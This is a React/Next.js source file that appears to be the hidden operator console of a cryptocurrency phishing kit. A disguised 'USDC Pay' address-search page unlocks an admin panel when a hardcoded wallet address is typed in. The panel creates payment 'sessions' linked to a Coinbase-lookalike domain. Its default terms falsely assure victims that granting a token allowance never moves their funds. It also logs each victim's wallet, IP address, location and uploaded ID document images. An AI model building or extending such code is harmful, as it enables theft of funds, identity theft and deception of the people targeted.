"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import EscrowShell from "@/components/EscrowShell";

// ─── Types ────────────────────────────────────────────────────────────────────

interface Session {
  id: string;
  recipient_name: string;
  amount_eur: number;
  issued_at: string;
  started_at: string | null;
  session_minutes: number;
  status: string;
  terms: string;
  min_balance_mode: "fixed" | "percent";
  min_balance_eur: number;
  min_balance_percent: number | null;
  recipient_wallet: string | null;
}

interface SessionEvent {
  id: string;
  event_type: string;
  wallet_address: string | null;
  ip_address: string | null;
  country: string | null;
  region: string | null;
  city: string | null;
  user_agent: string | null;
  created_at: string;
}

interface IdentityRecord {
  id: string;
  wallet_address: string;
  full_name: string;
  country: string;
  document_path: string;
  documentUrl: string | null;
  created_at: string;
}

// ─── Constants ────────────────────────────────────────────────────────────────

// Entering this address in the search box unlocks the admin dashboard.
const ADMIN_ADDRESS = "TP3mX1Uqhno2WUtdBPVie7nkuuJR1EQBxN";

const SESSION_KEY = "escrow_admin_secret";

const DEFAULT_TERMS = [
  "Your funds always remain in your own wallet. Connecting your wallet never moves or takes custody of any funds.",
  "You are only granting an on-chain permission (allowance) so the deposit can be finalized once every requirement below is met.",
  "This session is valid for a limited time. If it expires before all requirements are met, it closes automatically and the reserved amount is returned to the sender.",
].join("\n");

const EVM_EXPLORERS = [
  { label: "Etherscan", url: "https://etherscan.io/address/", logo: "/logos/ethereum.svg", chain: "Ethereum" },
  { label: "BscScan", url: "https://bscscan.com/address/", logo: "/logos/bnb.svg", chain: "BNB Chain" },
  { label: "Polygonscan", url: "https://polygonscan.com/address/", logo: "/logos/polygon.svg", chain: "Polygon" },
  { label: "Basescan", url: "https://basescan.org/address/", logo: "/logos/base.svg", chain: "Base" },
];

// ─── Utilities ────────────────────────────────────────────────────────────────

type AddressKind = "evm" | "tron" | "unknown";

function detectAddress(addr: string): AddressKind {
  const t = addr.trim();
  if (/^0x[0-9a-fA-F]{40}$/.test(t)) return "evm";
  // Tron: starts with T, base58 (no 0/O/I/l), typically 34 chars
  if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t)) return "tron";
  return "unknown";
}

function formatEUR(n: number) {
  return n.toLocaleString("en-IE", { style: "currency", currency: "EUR", maximumFractionDigits: 2 });
}

function statusPill(status: string) {
  const map: Record<string, string> = {
    pending: "bg-surface-strong text-body",
    active: "bg-brand/10 text-brand",
    completed: "bg-up/10 text-up",
    expired: "bg-down/10 text-down",
    cancelled: "bg-surface-strong text-muted",
  };
  return "inline-flex rounded-pill px-2.5 py-1 text-[11px] font-semibold " + (map[status] ?? "bg-surface-strong text-muted");
}

function short(addr: string) {
  if (!addr) return "";
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

function summarizeUA(ua: string | null) {
  if (!ua) return "Unknown";
  const browser = /Edg\//.test(ua) ? "Edge" : /OPR\//.test(ua) ? "Opera" : /Chrome\//.test(ua) ? "Chrome" : /Firefox\//.test(ua) ? "Firefox" : /Safari\//.test(ua) && !/Chrome/.test(ua) ? "Safari" : "Unknown";
  const os = /iPhone|iPad/.test(ua) ? "iOS" : /Android/.test(ua) ? "Android" : /Mac OS X/.test(ua) ? "macOS" : /Windows/.test(ua) ? "Windows" : /Linux/.test(ua) ? "Linux" : "Unknown OS";
  return `${browser} · ${os}`;
}

const EVENT_LABELS: Record<string, string> = {
  view: "Viewed page",
  connect: "Connected wallet",
  id_submitted: "Submitted ID",
  balance_check: "Checked balance",
  approved: "Approved deposit",
  expired: "Session expired",
};

// ─── Activity Panel (admin only) ──────────────────────────────────────────────

function ActivityPanel({ sessionId, secret }: { sessionId: string; secret: string }) {
  const [events, setEvents] = useState<SessionEvent[] | null>(null);
  const [records, setRecords] = useState<IdentityRecord[] | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    let cancelled = false;
    async function load() {
      setLoading(true);
      try {
        const [eventsRes, identityRes] = await Promise.all([
          fetch(`/api/escrow/admin/sessions/${sessionId}/events`, { headers: { Authorization: `Bearer ${secret}` } }),
          fetch(`/api/escrow/admin/sessions/${sessionId}/identity`, { headers: { Authorization: `Bearer ${secret}` } }),
        ]);
        const eventsJson = await eventsRes.json();
        const identityJson = await identityRes.json();
        if (cancelled) return;
        setEvents(eventsJson.ok ? eventsJson.events : []);
        setRecords(identityJson.ok ? identityJson.records : []);
      } catch (err) {
        console.error(err);
        if (!cancelled) { setEvents([]); setRecords([]); }
      } finally {
        if (!cancelled) setLoading(false);
      }
    }
    void load();
    return () => { cancelled = true; };
  }, [sessionId, secret]);

  const connectedAddresses = Array.from(
    new Map((events ?? []).filter((e) => e.wallet_address).map((e) => [e.wallet_address, e])).values()
  );

  if (loading) return <div className="px-6 py-6 text-[13px] text-muted">Loading activity...</div>;

  return (
    <div className="space-y-6 border-t border-hairline bg-surface-soft px-6 py-6">
      <div>
        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">
          Connected addresses ({connectedAddresses.length})
        </p>
        {connectedAddresses.length === 0 ? (
          <p className="text-[13px] text-muted">No wallet has connected yet.</p>
        ) : (
          <div className="space-y-1.5">
            {connectedAddresses.map((e) => (
              <div key={e.wallet_address} className="flex items-center justify-between rounded-md border border-hairline bg-bg px-3 py-2 text-[13px]">
                <span className="font-mono font-medium text-ink">{e.wallet_address}</span>
                <span className="text-[12px] text-muted">
                  {[e.city, e.region, e.country].filter(Boolean).join(", ") || "Unknown location"}
                </span>
              </div>
            ))}
          </div>
        )}
      </div>

      <div>
        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">
          ID records ({(records ?? []).length})
        </p>
        {(records ?? []).length === 0 ? (
          <p className="text-[13px] text-muted">No identity verification submitted yet.</p>
        ) : (
          <div className="space-y-3">
            {records!.map((r) => {
              const isImage = r.document_path
                ? /\.(jpe?g|png|webp|gif)$/i.test(r.document_path)
                : r.documentUrl
                ? /\.(jpe?g|png|webp|gif)(\?|$)/i.test(r.documentUrl)
                : false;
              return (
                <div key={r.id} className="overflow-hidden rounded-lg border border-hairline bg-bg text-[13px]">
                  <div className="flex flex-wrap items-start justify-between gap-2 px-3.5 py-3">
                    <div>
                      <span className="font-semibold text-ink">{r.full_name}</span>
                      <div className="mt-0.5 flex flex-wrap items-center gap-x-3 gap-y-1 text-[12px] text-body">
                        <span>{r.country}</span>
                        <span className="font-mono">{short(r.wallet_address)}</span>
                      </div>
                    </div>
                    <div className="flex flex-col items-end gap-1.5">
                      <span className="text-[11px] text-muted">{new Date(r.created_at).toLocaleString()}</span>
                      {r.documentUrl ? (
                        <a href={r.documentUrl} target="_blank" rel="noreferrer"
                          className="inline-flex items-center gap-1 rounded-pill bg-brand/10 px-2.5 py-1 text-[11px] font-semibold text-brand hover:bg-brand/20 transition">
                          <svg className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                          </svg>
                          View document
                        </a>
                      ) : (
                        <span className="text-[11px] text-muted">Document unavailable</span>
                      )}
                    </div>
                  </div>
                  {isImage && r.documentUrl && (
                    <div className="border-t border-hairline bg-surface-soft px-3.5 py-3">
                      <p className="mb-2 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">ID Preview</p>
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img src={r.documentUrl} alt={`ID for ${r.full_name}`}
                        className="max-h-48 w-auto rounded-md border border-hairline object-contain shadow-sm"
                        onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = "none"; }}
                      />
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>

      <div>
        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">
          Activity log ({(events ?? []).length})
        </p>
        {(events ?? []).length === 0 ? (
          <p className="text-[13px] text-muted">No activity recorded yet.</p>
        ) : (
          <div className="-mx-6 overflow-x-auto sm:mx-0">
            <div className="min-w-[600px] rounded-md border border-hairline bg-bg sm:min-w-0">
              <table className="w-full text-left text-[12px]">
                <thead>
                  <tr className="border-b border-hairline text-muted">
                    <th className="px-3 py-2 font-medium">Event</th>
                    <th className="px-3 py-2 font-medium">Wallet</th>
                    <th className="px-3 py-2 font-medium">Location</th>
                    <th className="px-3 py-2 font-medium">IP</th>
                    <th className="px-3 py-2 font-medium">Browser</th>
                    <th className="px-3 py-2 font-medium">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {events!.map((e) => (
                    <tr key={e.id} className="border-b border-hairline last:border-0">
                      <td className="px-3 py-2 font-medium text-ink">{EVENT_LABELS[e.event_type] ?? e.event_type}</td>
                      <td className="px-3 py-2 font-mono text-body">{e.wallet_address ? short(e.wallet_address) : "—"}</td>
                      <td className="px-3 py-2 text-body">{[e.city, e.region, e.country].filter(Boolean).join(", ") || "Unknown"}</td>
                      <td className="px-3 py-2 font-mono text-body">{e.ip_address ?? "—"}</td>
                      <td className="px-3 py-2 text-body">{summarizeUA(e.user_agent)}</td>
                      <td className="px-3 py-2 text-muted">{new Date(e.created_at).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Explorer Results (non-admin address) ─────────────────────────────────────

function ExplorerResults({ address, onBack }: { address: string; onBack: () => void }) {
  const kind = detectAddress(address);

  if (kind === "tron") {
    // Redirect to Tronscan immediately
    if (typeof window !== "undefined") {
      window.open(`https://tronscan.org/#/address/${address}`, "_blank", "noopener,noreferrer");
    }
    return (
      <div className="flex min-h-screen flex-col items-center justify-center gap-6 bg-bg px-4">
        <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-8 shadow-card text-center">
          <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-[#EF0027]/10">
            <span className="text-2xl">🔴</span>
          </div>
          <h2 className="mb-1 text-[17px] font-semibold text-ink">Tron Address</h2>
          <p className="mb-1 text-[13px] text-body">Opening Tronscan in a new tab…</p>
          <p className="mb-5 break-all font-mono text-[12px] text-muted">{address}</p>
          <a
            href={`https://tronscan.org/#/address/${address}`}
            target="_blank" rel="noopener noreferrer"
            className="inline-flex h-10 items-center gap-2 rounded-pill bg-[#EF0027] px-5 text-[13px] font-semibold text-white transition hover:opacity-90"
          >
            Open Tronscan
          </a>
          <div className="mt-4">
            <button onClick={onBack} className="text-[13px] text-muted hover:text-ink transition">
              ← Back to search
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (kind === "evm") {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center gap-6 bg-bg px-4">
        <div className="w-full max-w-md rounded-2xl border border-hairline bg-surface-card p-8 shadow-card">
          <div className="mb-5">
            <h2 className="text-[17px] font-semibold text-ink">EVM Address</h2>
            <p className="mt-0.5 break-all font-mono text-[12px] text-muted">{address}</p>
          </div>
          <p className="mb-4 text-[13px] text-body">Select a blockchain explorer to view this address:</p>
          <div className="space-y-2.5">
            {EVM_EXPLORERS.map((ex) => (
              <a
                key={ex.label}
                href={`${ex.url}${address}`}
                target="_blank" rel="noopener noreferrer"
                className="flex items-center gap-3 rounded-xl border border-hairline bg-bg px-4 py-3.5 text-[14px] font-medium text-ink transition hover:border-brand hover:bg-brand/5"
              >
                <span className="flex h-8 w-8 items-center justify-center overflow-hidden rounded-full border border-hairline bg-surface-soft">
                  <Image src={ex.logo} alt={ex.chain} width={22} height={22} className="object-contain" />
                </span>
                <div className="min-w-0 flex-1">
                  <div className="font-semibold text-ink">{ex.label}</div>
                  <div className="text-[11px] text-muted">{ex.chain}</div>
                </div>
                <svg className="h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                </svg>
              </a>
            ))}
          </div>
          <div className="mt-5">
            <button onClick={onBack} className="text-[13px] text-muted hover:text-ink transition">
              ← Back to search
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Unknown format
  return null;
}

// ─── Admin Dashboard ──────────────────────────────────────────────────────────

function AdminDashboard({ onSignOut }: { onSignOut: () => void }) {
  const secret = ADMIN_ADDRESS;
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [formError, setFormError] = useState<string | null>(null);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [justCreatedLink, setJustCreatedLink] = useState<string | null>(null);

  const [recipientName, setRecipientName] = useState("");
  const [amountEur, setAmountEur] = useState("");
  const [sessionMinutes, setSessionMinutes] = useState("25");
  const [minBalanceMode, setMinBalanceMode] = useState<"fixed" | "percent">("percent");
  const [minBalanceEur, setMinBalanceEur] = useState("100");
  const [minBalancePercent, setMinBalancePercent] = useState("5");
  const [terms, setTerms] = useState(DEFAULT_TERMS);

  useEffect(() => { void loadSessions(); }, []);

  async function loadSessions() {
    setLoading(true);
    try {
      const res = await fetch("/api/escrow/admin/sessions", {
        headers: { Authorization: `Bearer ${secret}` },
      });
      const json = await res.json();
      if (json.ok) setSessions(json.sessions ?? []);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }

  const parsedAmount = parseFloat(amountEur) || 0;
  const previewMinBalance =
    minBalanceMode === "percent"
      ? (parsedAmount * (parseFloat(minBalancePercent) || 0)) / 100
      : parseFloat(minBalanceEur) || 0;

  async function handleCreate(e: React.FormEvent) {
    e.preventDefault();
    setFormError(null);
    const amount = parseFloat(amountEur);
    if (!recipientName.trim()) return setFormError("Enter a recipient name.");
    if (!Number.isFinite(amount) || amount <= 0) return setFormError("Enter a valid amount.");
    if (minBalanceMode === "percent") {
      const pct = parseFloat(minBalancePercent);
      if (!Number.isFinite(pct) || pct <= 0 || pct > 100) return setFormError("Enter a valid percentage (1–100).");
    }
    setSubmitting(true);
    try {
      const res = await fetch("/api/escrow/admin/sessions", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
        body: JSON.stringify({
          recipientName: recipientName.trim(),
          amountEur: amount,
          sessionMinutes: parseInt(sessionMinutes, 10) || 25,
          minBalanceMode,
          minBalanceEur: parseFloat(minBalanceEur) || 100,
          minBalancePercent: parseFloat(minBalancePercent) || 5,
          terms,
        }),
      });
      const json = await res.json();
      if (!json.ok) { setFormError("Couldn't create the session."); return; }
      setRecipientName("");
      setAmountEur("");
      const entryDomain = process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
      setJustCreatedLink(`${entryDomain}/pay/${json.session.id}`);
      await loadSessions();
    } catch (err) {
      console.error(err);
      setFormError("Couldn't reach the server.");
    } finally {
      setSubmitting(false);
    }
  }

  async function copyLink(id: string, label = id) {
    const entryDomain = process.env.NEXT_PUBLIC_COINBASE_DOMAIN ?? "https://coinbase.usdc-pay.com";
    const link = `${entryDomain}/pay/${id}`;
    try {
      await navigator.clipboard.writeText(link);
      setCopiedId(label);
      setTimeout(() => setCopiedId((prev) => (prev === label ? null : prev)), 2000);
    } catch (err) { console.error(err); }
  }

  async function handleCancel(id: string) {
    await fetch(`/api/escrow/admin/sessions/${id}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${secret}` },
      body: JSON.stringify({ status: "cancelled" }),
    });
    await loadSessions();
  }

  return (
    <EscrowShell>
      <div className="mx-auto max-w-[1000px] px-4 py-8 sm:px-8 sm:py-10">
        <div className="mb-7 flex items-center justify-between">
          <h1 className="text-[20px] font-semibold text-ink sm:text-[24px]">Sessions</h1>
          <button onClick={onSignOut} className="text-[13px] font-medium text-muted hover:text-ink transition">
            Sign out
          </button>
        </div>

        {justCreatedLink && (
          <div className="mb-6 flex flex-wrap items-center justify-between gap-3 rounded-xl border border-brand/20 bg-brand/5 px-5 py-4">
            <div>
              <p className="mb-1 text-[12px] font-semibold uppercase tracking-[0.06em] text-brand">Session created</p>
              <p className="break-all font-mono text-[13px] text-ink">{justCreatedLink}</p>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => void copyLink("just-created-id", "just-created").then(() => navigator.clipboard.writeText(justCreatedLink).then(() => { setCopiedId("just-created"); setTimeout(() => setCopiedId(null), 2000); }))}
                className="h-9 rounded-pill bg-brand px-4 text-[13px] font-semibold text-on-brand transition hover:bg-brand-active"
              >
                {copiedId === "just-created" ? "Copied!" : "Copy link"}
              </button>
              <button onClick={() => setJustCreatedLink(null)} className="text-[13px] text-muted hover:text-ink">Dismiss</button>
            </div>
          </div>
        )}

        <form onSubmit={handleCreate} className="mb-8 rounded-xl border border-hairline bg-surface-card p-4 shadow-card sm:p-6">
          <h2 className="mb-4 text-[16px] font-semibold text-ink">New session</h2>
          <div className="mb-4 grid gap-3 sm:grid-cols-2">
            <div>
              <label className="mb-1.5 block text-[13px] font-semibold text-ink">Recipient name</label>
              <input value={recipientName} onChange={(e) => setRecipientName(e.target.value)}
                className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                placeholder="Jane Doe" />
            </div>
            <div>
              <label className="mb-1.5 block text-[13px] font-semibold text-ink">Amount (EUR)</label>
              <input value={amountEur} onChange={(e) => setAmountEur(e.target.value.replace(/[^0-9.]/g, ""))}
                className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                placeholder="2000" inputMode="decimal" />
            </div>
            <div>
              <label className="mb-1.5 block text-[13px] font-semibold text-ink">Session length (minutes)</label>
              <input value={sessionMinutes} onChange={(e) => setSessionMinutes(e.target.value.replace(/[^0-9]/g, ""))}
                className="h-11 w-full rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                inputMode="numeric" />
            </div>
          </div>

          <div className="mb-5 rounded-lg border border-hairline bg-surface-soft p-4">
            <label className="mb-2.5 block text-[13px] font-semibold text-ink">Minimum balance requirement</label>
            <div className="mb-3 inline-flex rounded-pill border border-hairline bg-bg p-1">
              {(["percent", "fixed"] as const).map((mode) => (
                <button key={mode} type="button" onClick={() => setMinBalanceMode(mode)}
                  className={"rounded-pill px-3.5 py-1.5 text-[12px] font-semibold transition " +
                    (minBalanceMode === mode ? "bg-brand text-on-brand" : "text-body hover:text-ink")}>
                  {mode === "percent" ? "% of amount" : "Fixed EUR amount"}
                </button>
              ))}
            </div>
            {minBalanceMode === "percent" ? (
              <div className="flex items-center gap-2">
                <input value={minBalancePercent} onChange={(e) => setMinBalancePercent(e.target.value.replace(/[^0-9.]/g, ""))}
                  className="h-11 w-24 rounded-md border border-hairline bg-bg px-3 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                  inputMode="decimal" />
                <span className="text-[14px] text-body">% of the checkout amount</span>
              </div>
            ) : (
              <input value={minBalanceEur} onChange={(e) => setMinBalanceEur(e.target.value.replace(/[^0-9.]/g, ""))}
                className="h-11 w-40 rounded-md border border-hairline bg-bg px-3.5 text-[14px] text-ink focus:border-2 focus:border-brand focus:outline-none"
                inputMode="decimal" />
            )}
            <p className="mt-2.5 text-[12px] text-muted">
              Recipients need at least <span className="font-semibold text-ink">{formatEUR(previewMinBalance)}</span> in
              USDT/USDC across supported chains before they can approve the deposit.
            </p>
          </div>

          <div className="mb-5">
            <label className="mb-1.5 block text-[13px] font-semibold text-ink">Terms shown to recipient</label>
            <textarea value={terms} onChange={(e) => setTerms(e.target.value)} rows={4}
              className="w-full rounded-md border border-hairline bg-bg px-3.5 py-3 text-[13px] leading-relaxed text-ink focus:border-2 focus:border-brand focus:outline-none" />
          </div>

          {formError && <p className="mb-4 text-[13px] text-down">{formError}</p>}
          <button type="submit" disabled={submitting}
            className="h-11 rounded-pill bg-brand px-6 text-[14px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled">
            {submitting ? "Creating..." : "Create session"}
          </button>
        </form>

        <div className="rounded-xl border border-hairline bg-surface-card shadow-card">
          <div className="border-b border-hairline px-6 py-4">
            <h2 className="text-[16px] font-semibold text-ink">History</h2>
          </div>
          {loading ? (
            <div className="px-6 py-10 text-center text-[13px] text-muted">Loading sessions…</div>
          ) : (
            <div className="divide-y divide-hairline">
              {sessions.length === 0 && (
                <p className="px-6 py-8 text-center text-[13px] text-muted">No sessions yet.</p>
              )}
              {sessions.map((s) => (
                <div key={s.id}>
                  <button
                    onClick={() => setExpanded((prev) => (prev === s.id ? null : s.id))}
                    className="flex w-full flex-col gap-2 px-4 py-4 text-left transition hover:bg-surface-soft sm:flex-row sm:items-center sm:justify-between sm:gap-3 sm:px-6"
                  >
                    <div className="min-w-0 flex-1">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="text-[14px] font-semibold text-ink">{s.recipient_name}</span>
                        <span className={statusPill(s.status)}>{s.status}</span>
                        <span className="font-mono text-[14px] font-semibold text-ink sm:hidden">{formatEUR(s.amount_eur)}</span>
                      </div>
                      <p className="mt-0.5 text-[11px] text-muted">
                        {new Date(s.issued_at).toLocaleString()} · Min{" "}
                        {s.min_balance_mode === "percent" ? `${s.min_balance_percent}%` : formatEUR(s.min_balance_eur)}
                        {s.recipient_wallet ? ` · ${short(s.recipient_wallet)}` : ""}
                      </p>
                    </div>
                    <div className="flex items-center gap-3">
                      <span className="hidden font-mono text-[15px] font-medium text-ink sm:block">{formatEUR(s.amount_eur)}</span>
                      {(s.status === "pending" || s.status === "active") && (
                        <span onClick={(e) => { e.stopPropagation(); void copyLink(s.id); }}
                          className="text-[12px] font-semibold text-brand hover:underline cursor-pointer">
                          {copiedId === s.id ? "Copied!" : "Copy link"}
                        </span>
                      )}
                      {(s.status === "pending" || s.status === "active") && (
                        <span onClick={(e) => { e.stopPropagation(); void handleCancel(s.id); }}
                          className="text-[12px] font-semibold text-down hover:underline cursor-pointer">
                          Cancel
                        </span>
                      )}
                      <svg className={"h-4 w-4 shrink-0 text-muted transition-transform " + (expanded === s.id ? "rotate-180" : "")}
                        fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                      </svg>
                    </div>
                  </button>
                  {expanded === s.id && <ActivityPanel sessionId={s.id} secret={secret} />}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </EscrowShell>
  );
}

// ─── Search Screen (entry point) ──────────────────────────────────────────────

type PagePhase = "search" | "results" | "admin";

export default function SearchPage() {
  const [query, setQuery] = useState("");
  const [phase, setPhase] = useState<PagePhase>("search");
  const [resultAddress, setResultAddress] = useState("");
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // If user had previously authenticated, restore admin view
    const stored = typeof window !== "undefined" ? sessionStorage.getItem(SESSION_KEY) : null;
    if (stored === ADMIN_ADDRESS) setPhase("admin");
  }, []);

  function handleSearch(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    const trimmed = query.trim();
    if (!trimmed) { setError("Enter a wallet address to search."); return; }

    // Admin unlock
    if (trimmed === ADMIN_ADDRESS) {
      sessionStorage.setItem(SESSION_KEY, ADMIN_ADDRESS);
      setPhase("admin");
      return;
    }

    const kind = detectAddress(trimmed);
    if (kind === "unknown") {
      setError("That doesn't look like a valid EVM (0x…) or Tron (T…) address.");
      return;
    }

    setResultAddress(trimmed);
    setPhase("results");
  }

  function handleSignOut() {
    sessionStorage.removeItem(SESSION_KEY);
    setPhase("search");
    setQuery("");
  }

  if (phase === "admin") return <AdminDashboard onSignOut={handleSignOut} />;
  if (phase === "results") return <ExplorerResults address={resultAddress} onBack={() => { setPhase("search"); setQuery(""); }} />;

  // ── Search screen ──────────────────────────────────────────────────────────
  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-bg px-4">
      <div className="w-full max-w-md">
        {/* Logo */}
        <div className="mb-8 flex flex-col items-center gap-2">
          <svg viewBox="0 0 32 32" className="h-11 w-11" fill="none">
            <circle cx="16" cy="16" r="16" fill="#0052FF" />
            <circle cx="16" cy="16" r="7" fill="none" stroke="#fff" strokeWidth="2.5" />
          </svg>
          <span className="text-[15px] font-semibold text-ink">USDC Pay</span>
        </div>

        <div className="rounded-2xl border border-hairline bg-surface-card p-8 shadow-card">
          <h1 className="mb-1 text-center text-[20px] font-semibold text-ink">Search</h1>
          <p className="mb-7 text-center text-[13px] text-body">
            Enter any wallet address to look it up on the blockchain.
          </p>

          <form onSubmit={handleSearch} className="space-y-3">
            <div className="relative">
              <div className="pointer-events-none absolute inset-y-0 left-3.5 flex items-center">
                <svg className="h-4 w-4 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                </svg>
              </div>
              <input
                type="text"
                value={query}
                onChange={(e) => { setQuery(e.target.value); setError(null); }}
                placeholder="0x… or T… wallet address"
                spellCheck={false}
                autoComplete="off"
                className="h-12 w-full rounded-xl border border-hairline bg-bg pl-10 pr-4 font-mono text-[13px] text-ink placeholder:font-sans placeholder:text-muted focus:border-brand focus:outline-none focus:ring-2 focus:ring-brand/20"
              />
            </div>

            {error && (
              <p className="flex items-center gap-1.5 text-[13px] text-down">
                <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
                {error}
              </p>
            )}

            <button
              type="submit"
              className="h-12 w-full rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
            >
              Search
            </button>
          </form>

          {/* Supported chains */}
          <div className="mt-6 flex items-center justify-center gap-3">
            {[
              { label: "Ethereum", logo: "/logos/ethereum.svg" },
              { label: "BNB Chain", logo: "/logos/bnb.svg" },
              { label: "Polygon", logo: "/logos/polygon.svg" },
              { label: "Base", logo: "/logos/base.svg" },
              { label: "Tron", logo: "/logos/tron.png" },
            ].map((c) => (
              <span key={c.label} title={c.label}
                className="flex h-7 w-7 items-center justify-center overflow-hidden rounded-full border border-hairline bg-surface-soft opacity-70">
                <Image src={c.logo} alt={c.label} width={18} height={18} className="object-contain" />
              </span>
            ))}
          </div>
          <p className="mt-2 text-center text-[11px] text-muted">Supports Ethereum, BNB Chain, Polygon, Base, Tron</p>
        </div>
      </div>
    </div>
  );
}
